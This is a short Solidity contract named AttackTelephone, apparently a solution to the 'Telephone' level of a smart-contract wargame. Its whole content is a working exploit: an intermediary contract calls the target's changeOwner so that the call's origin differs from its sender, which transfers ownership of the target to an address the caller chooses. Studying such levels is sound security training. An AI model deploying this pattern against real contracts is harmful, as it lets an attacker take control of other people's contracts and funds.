// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import './Telephone.sol';

contract AttackTelephone {

    Telephone telephone;
    address public owner;

    constructor(address _telephone) {
        telephone = Telephone(_telephone);
        owner = msg.sender;
    }

    function changeOwner(address _newOwner) external {
        telephone.changeOwner(_newOwner);
    }

}